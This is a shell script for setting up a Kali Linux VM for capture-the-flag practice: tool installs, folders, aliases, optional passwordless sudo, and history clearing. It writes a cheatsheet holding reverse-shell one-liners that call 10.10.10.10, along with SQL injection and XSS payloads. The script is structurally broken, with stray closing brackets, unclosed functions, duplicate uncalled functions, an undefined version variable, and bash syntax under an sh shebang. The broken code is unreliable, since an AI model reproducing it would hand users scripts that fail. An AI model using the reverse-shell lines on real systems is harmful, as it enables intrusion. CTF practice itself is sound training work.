#!/bin/sh
# install.sh

# Kali Linux CTF VM Setup Script
# Automates the setup of a Kali Linux VM for CTF competitions
# Tested on Kali Linux 2025.x
# Run as root: sudo ./ctf_setup.sh
# Date: June 19, 2025

# Configuration
LOG_FILE="/root/ctf_setup.log"
TOOLS_DIR="/root/tools"
CTF_DIR="/root/CTF"
KALI_USER="kali"  # Default Kali user; adjust if changed

# Function to prompt for target user directory
prompt_target_user() {
    while true; do
        read -p "Which user directory should tools be installed in? [kali]: " target_user
        target_user=${target_user:-kali}  # Default to "kali" if empty
        
        # Check if user directory exists
        if [ -d "/home/$target_user" ]; then
            echo -e "${GREEN}Using user directory: /home/$target_user${NC}"
            TARGET_USER="$target_user"
            break
        else
            echo -e "${RED}Error: User directory /home/$target_user does not exist.${NC}"
            if prompt_yes_no "Create user directory /home/$target_user?"; then
                mkdir -p "/home/$target_user"
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Created user directory: /home/$target_user${NC}"
                    TARGET_USER="$target_user"
                    break
                else
                    echo -e "${RED}Failed to create user directory${NC}"
                fi
            fi
        fi
    done
}

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

NON_INTERACTIVE=false
if [ "$1" = "--yes-to-all" ]; then
    NON_INTERACTIVE=true
fi

# Function to log messages
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Track failures and continue on error
FAILED_STEPS=()

# Record a failure explicitly (useful with `|| record_failure "Step"`)
record_failure() {
    local msg="$1"
    log "${RED}Error: ${msg} failed. Continuing...${NC}"
    FAILED_STEPS+=("$msg")
    return 1
}

# Function to check if command executed successfully
check_error() {
    local status=$?
    local msg="$1"
    if [ $status -ne 0 ]; then
        log "${RED}Error: ${msg} failed (exit ${status}). Continuing...${NC}"
        FAILED_STEPS+=("$msg")
        return 1
    fi
    return 0
}

# Function to prompt user for confirmation
prompt_yes_no() {
    if [ "$NON_INTERACTIVE" = true ]; then
        return 0
    fi
    while true; do
        printf "%s" "$1 [y/N]: "
        read yn
        case $yn in
            [Yy]* ) return 0 ;;
            [Nn]* | "" ) return 1 ;;
            * ) echo "Please answer y or n." ;;
        esac
    done
}

# Banner
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}Kali Linux CTF VM Setup Script${NC}"
echo -e "${GREEN}============================================================${NC}"
log "Starting CTF VM setup"

# Prompt for target user directory
prompt_target_user

# Ensure script is run as root
if [ "$EUID" -ne 0 ]; then
    log "${RED}This script must be run as root (use sudo)${NC}"
    exit 1
fi

# Initialize log file
echo -e "Kali Linux CTF VM Setup Log\n" > "$LOG_FILE"

# Update system
log "Updating system"
apt update && apt upgrade -y

# 1. Base VM Setup (Networking check)
log "Checking network configuration"
if ip a | grep -q "inet "; then
    log "${GREEN}Network interfaces detected${NC}"
else
    log "${YELLOW}Warning: No network interfaces detected. Ensure NAT and Host-Only adapters are configured.${NC}"
fi

# 2. Essential Tools Installation
log "Installing tools"

# 2.1 Core Tools
log "Installing core tools"
apt install -y \
    nmap netcat-traditional tcpdump wireshark curl wget bind9-dnsutils git \
    python3 python3-pip ruby perl golang make build-essential
check_error "Core tools installation"

install_core_tools() {
    log "Installing core tools"
    apt install -y \
        nmap netcat tcpdump wireshark curl wget dnsutils git \
        python3 python3-pip ruby perl golang make build-essential
}

# 2.3 Web Exploitation
if prompt_yes_no "Install web exploitation tools (burpsuite, sqlmap, wfuzz, etc.)?"; then
    log "Installing web exploitation tools"
    apt install -y \
        burpsuite zaproxy wfuzz sqlmap wafw00f
    check_error "Web tools installation"
fi

# 2.4 Reverse Engineering & Binary Exploitation
if prompt_yes_no "Install reverse engineering tools (radare2, gdb, etc.)?"; then
    log "Installing reverse engineering tools"
    apt install -y \
        radare2 gdb binwalk apktool dex2jar jd-gui
    check_error "Reverse engineering tools installation"
fi

install_reverse_engineering_tools() {
    if prompt_yes_no "Install reverse engineering tools (ghidra, radare2, gdb, etc.)?"; then
        log "Installing reverse engineering tools"
        apt install -y \
            radare2 gdb peda binwalk apktool dex2jar jd-gui cutter

        # Install Ghidra
        log "Installing Ghidra"
        apt install -y openjdk-17-jre
        mkdir -p "$TOOLS_DIR"
        (
            cd "$TOOLS_DIR"
            wget "https://github.com/NationalSecurityAgency/ghidra/releases/download/GHIDRA_${GHIDRA_VERSION}/ghidra_${GHIDRA_VERSION}.zip" -O ghidra.zip
            unzip -o ghidra.zip
            rm ghidra.zip
        )
    fi
}

install_forensics_tools() {
    if prompt_yes_no "Install forensics tools (foremost, sleuthkit, steghide, etc.)?"; then
        log "Installing forensics tools"
        apt install -y \
            foremost sleuthkit steghide stegosuite exiftool
    fi
}

# 2.7 Exploit Development
if prompt_yes_no "Install exploit development tools (metasploit, pwntools, etc.)?"; then
    log "Installing exploit development tools"
    apt install -y \
        metasploit-framework exploitdb ropper
    check_error "Exploit development tools installation"
fi

# 2.8 Python Environment
log "Setting up Python virtual environment"
python3 -m venv "/home/$TARGET_USER/CTF/venv"
check_error "Virtual environment creation"
source "/home/$TARGET_USER/CTF/venv/bin/activate"
pip install --upgrade pip
pip install pwntools requests flask r2pipe pillow
check_error "Python packages installation"
deactivate

# 2.9 Additional Downloads
if prompt_yes_no "Install SecLists? WARNING: This is a very large download (~2GB) containing extensive wordlists and payloads. Skip if you have limited bandwidth or storage space."; then
    log "Downloading SecLists"
    git clone https://github.com/danielmiessler/SecLists.git "/home/$TARGET_USER/tools/SecLists" || record_failure "SecLists clone"
else
    log "Skipping SecLists installation"
fi

# 3. Directory Structure
log "Creating CTF directory structure"
mkdir -p "/home/$TARGET_USER/CTF"/{tools,notes,binaries,web,reversing,pwn,crypto,forensics,writeups}
check_error "Directory creation"

# Initialize Git for notes
log "Initializing Git for notes"
if [ ! -d "/home/$TARGET_USER/CTF/notes/.git" ]; then
    cd "/home/$TARGET_USER/CTF/notes" || check_error "Change to notes directory"
    git init
    touch notes.md cheatsheet.md
    cat <<EOL > cheatsheet.md
# CTF Cheatsheet

## Reverse Shells
- Netcat: \`nc -e /bin/bash 10.10.10.10 4444\`
- Socat: \`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444\`

## Web Payloads
- SQL Injection: \`' OR 1=1 --\`
- XSS: \`<script>alert('XSS')</script>\`

## Common Commands
- Nmap: \`nmap -sC -sV -Pn <target>\`
- Gobuster: \`gobuster dir -u <url> -w ~/tools/SecLists/Discovery/Web-Content/common.txt\`
EOL
            git add .
            git commit -m "Initial CTF notes"
        )
    else
        log "${YELLOW}Warning: Git repository already exists in notes directory. Skipping initialization.${NC}"
    fi
}

# 4. Aliases and Bash Settings
log "Configuring bash aliases"
cat <<EOL >> "/home/$TARGET_USER/.bashrc"
# CTF Aliases
alias ..='cd ..'
alias ...='cd ../..'
alias c='clear'
alias ll='ls -lah --color=auto'
alias myip="ip a | grep inet"
alias ports="netstat -tulanp"
alias nmapquick="nmap -sC -sV -Pn"
alias nmapfull="nmap -sC -sV -p- -T4"
alias nmapudp="nmap -sU -Pn"

# Extract Function
extract () {
  if [ -f "\$1" ] ; then
    case "\$1" in
      *.tar.bz2)   tar xvjf "\$1"    ;;
      *.tar.gz)    tar xvzf "\$1"    ;;
      *.tar.xz)    tar xvf "\$1"     ;;
      *.bz2)       bunzip2 "\$1"     ;;
      *.rar)       unrar x "\$1"     ;;
      *.gz)        gunzip "\$1"      ;;
      *.tar)       tar xvf "\$1"     ;;
      *.tbz2)      tar xvjf "\$1"    ;;
      *.tgz)       tar xvzf "\$1"    ;;
      *.zip)       unzip -o "\$1"    ;;
      *.7z)        7z x "\$1"        ;;
      *.xz)        xz -d "\$1"       ;;
      *)           echo "'\$1' cannot be extracted" ;;
    esac
  else
    echo "'\$1' is not a valid file"
  fi
}
EOL
check_error "Bash aliases configuration"
source "/home/$TARGET_USER/.bashrc"

# 5. Config Tweaks
if prompt_yes_no "Enable passwordless sudo (WARNING: Reduces security, use only in isolated VMs)?"; then
    log "Enabling passwordless sudo"
    echo "$TARGET_USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/kali
    chmod 0440 /etc/sudoers.d/kali
    check_error "Passwordless sudo configuration"
fi

apply_config_tweaks() {
    log "--- Applying Config Tweaks ---"
    if prompt_yes_no "Enable passwordless sudo (WARNING: Reduces security, use only in isolated VMs)?"; then
        log "Enabling passwordless sudo"
        echo "$KALI_USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/kali
        chmod 0440 /etc/sudoers.d/kali
    fi

# 7. Test Setup
if prompt_yes_no "Install test environments (DVWA, Vulnix, CTF write-ups)?"; then
    log "Installing test environments"
    apt install -y docker.io
    systemctl start docker
    check_error "Docker installation"
    docker pull vulnerables/web-dvwa
    check_error "DVWA pull"
    apt install -y vulnix
    check_error "Vulnix installation"
    git clone https://github.com/ctfs/write-ups-2014 "/home/$TARGET_USER/CTF/writeups"
    check_error "CTF write-ups clone"
fi

# 8. Final Cleanup
log "Performing cleanup"
apt autoremove -y
apt clean
rm -rf "/home/$TARGET_USER/.cache/*" "/home/$TARGET_USER/tools/*.zip"
history -c
rm -rf "/home/$TARGET_USER/.bash_history"
check_error "Cleanup"

# 9. Optional Extras
if prompt_yes_no "Install Zsh and Oh My Zsh?"; then
    log "Installing Zsh and Oh My Zsh"
    apt install -y zsh
    check_error "Zsh installation"
    su - "$TARGET_USER" -c "sh -c \"\$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
    su - "$TARGET_USER" -c "git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions"
    su - "$TARGET_USER" -c "git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.oh-my-zsh/plugins/zsh-syntax-highlighting"
    echo "plugins=(git zsh-autosuggestions zsh-syntax-highlighting)" >> "/home/$TARGET_USER/.zshrc"
    chsh -s /bin/zsh "$TARGET_USER"
    check_error "Zsh configuration"
fi

install_test_environments() {
    log "--- Installing Test Environments ---"
    if prompt_yes_no "Install test environments (DVWA, Vulnix, CTF write-ups)?"; then
        log "Installing test environments"
        apt install -y docker.io
        systemctl start docker
        docker pull vulnerables/web-dvwa
        apt install -y vulnix
        git clone https://github.com/ctfs/write-ups-2014 "$CTF_DIR/writeups"
    fi
}

perform_cleanup() {
    log "--- Performing Cleanup ---"
    apt autoremove -y
    apt clean
    rm -rf "/home/$KALI_USER/.cache/*" "$TOOLS_DIR/*.zip"
    history -c
    rm -rf "/home/$KALI_USER/.bash_history"
}

install_optional_extras() {
    log "--- Installing Optional Extras ---"
    if prompt_yes_no "Install Zsh and Oh My Zsh?"; then
        log "Installing Zsh and Oh My Zsh"
        apt install -y zsh fzf zsh-completions
        su - "$KALI_USER" -c "sh -c \"\$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
        su - "$KALI_USER" -c "git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions"
        su - "$KALI_USER" -c "git clone https://github.com/zsh-users/zsh-syntax-highlighting ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting"
        su - "$KALI_USER" -c "git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/themes/powerlevel10k"

        # Configure .zshrc
        ZSHRC_FILE="/home/$KALI_USER/.zshrc"
        sed -i 's/ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' "$ZSHRC_FILE"
        sed -i 's/plugins=(git)/plugins=(git zsh-autosuggestions zsh-syntax-highlighting zsh-completions fzf)/' "$ZSHRC_FILE"

        chsh -s /bin/zsh "$KALI_USER"
    fi

    if prompt_yes_no "Configure ProxyChains?"; then
        log "Configuring ProxyChains"
        apt install -y proxychains
        cat <<EOL > /etc/proxychains.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
# Example: Tor
socks5 127.0.0.1 9050
EOL
    fi

if prompt_yes_no "Install Nerd Fonts?"; then
    log "Installing Nerd Fonts"
    mkdir -p "/home/$TARGET_USER/.fonts"
    wget -P "/home/$TARGET_USER/.fonts" https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/Hack.zip
    unzip "/home/$TARGET_USER/.fonts/Hack.zip" -d "/home/$TARGET_USER/.fonts/Hack"
    fc-cache -fv
    rm "/home/$TARGET_USER/.fonts/Hack.zip"
    check_error "Nerd Fonts installation"
    chown -R "$TARGET_USER:$TARGET_USER" "/home/$TARGET_USER/.fonts"
fi

# 10. Verification
log "Verifying setup"
echo -e "${YELLOW}Running verification tests${NC}"
ip a >> "$LOG_FILE"
ufw status >> "$LOG_FILE"
nmap --version >> "$LOG_FILE" 2>&1 || log "${YELLOW}Nmap verification failed${NC}"
burpsuite --version >> "$LOG_FILE" 2>&1 || log "${YELLOW}Burp Suite verification failed${NC}"
sqlmap --version >> "$LOG_FILE" 2>&1 || log "${YELLOW}SQLMap verification failed${NC}"
john --version >> "$LOG_FILE" 2>&1 || log "${YELLOW}John verification failed${NC}"
ls "/home/$TARGET_USER/tools/SecLists/Passwords" >> "$LOG_FILE" 2>&1 || log "${YELLOW}SecLists verification failed${NC}"

# Summary of failures
if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo -e "${RED}============================================================${NC}"
    log "${RED}Completed with failures. The following steps failed:${NC}"
    for step in "${FAILED_STEPS[@]}"; do
        log " - $step"
    done
    echo -e "${RED}============================================================${NC}"
    FINAL_EXIT=1
else
    FINAL_EXIT=0
fi

# Final Instructions
if [ $FINAL_EXIT -eq 0 ]; then
    log "${GREEN}Setup complete!${NC}"
else
    log "${YELLOW}Setup completed with some failures. See $LOG_FILE for details.${NC}"
fi
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}Next Steps:${NC}"
echo -e "1. Shut down the VM and take a snapshot named 'CTF Base'."
echo -e "2. Test DVWA: Run 'docker run -it --rm -p 80:80 vulnerables/web-dvwa' and visit http://localhost."
echo -e "3. Start CTFs on TryHackMe or HackTheBox."
echo -e "4. Check $LOG_FILE for details."
echo -e "${GREEN}Happy Hacking!${NC}"
echo -e "${GREEN}============================================================${NC}"

exit $FINAL_EXIT
